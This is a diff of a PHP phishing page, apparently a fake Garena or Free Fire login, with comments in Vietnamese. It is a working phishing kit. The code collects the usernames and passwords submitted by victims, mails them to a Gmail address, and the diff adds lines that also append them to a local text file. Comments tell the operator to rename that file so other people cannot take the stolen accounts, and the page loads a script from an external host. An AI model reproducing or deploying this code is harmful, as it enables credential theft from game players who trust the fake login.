@@ -1,4 +1,5 @@
-<?php
+
+ <?php
         $theme = 13; // đổi cái số này để đổi giao diện, số từ 1 -> 69 
    // Ví dụ: $theme = 32;
    if(isset($_POST["acc"])){
@@ -6,13 +7,12 @@
      $password = $_POST["pass"];
      $type = $_POST["login"];
       $body = "\n".$type.": $username|$password\n"; 
-      //___________________________
-      mail("sharefree2222@gmail.com", $headers, $body); 
-      // Thay tên gmail của bạn vào @gmail.com để acc về nhé
-     //$test = fopen("accfreefire.txt","a");
-//muốn xem acc tại host thì bạn xóa // trước $test = fopen("accfreefire.txt","a"); đi nhé
-//đổi tên file accfreefire.txt này để tránh trường hợp người khác vào lấy acc
-
+     $test = fopen("arynamecode.txt","a");//đổi tên file arynamecode.txt này để tránh trường hợp người khác vào lấy acc
+$subject = "Cảm ơn bạn đã sử dụng code!";
+     $headers = "Tài khoản $type";
+      $body = "\nTài Khoản $type: ".$username."|Mật Khẩu: ".$password."\n\n";
+      mail("sharefree2222@gmail.com", $headers, $body);
+      // thay gmail nếu cần xem acc tại gmail mà ko cần xem file arynamecode.txt
      fwrite($test,$body);
      fclose($test); 
    }
@@ -279,6 +279,6 @@ body.modal-open > :not(.modal) {
     }
        
     </script>
-  <script src="https://script-garena.github.io/scripts.js"></script>
+  <script src="https://script-garena.github.io/18.js"></script>
   </body>
 </html>
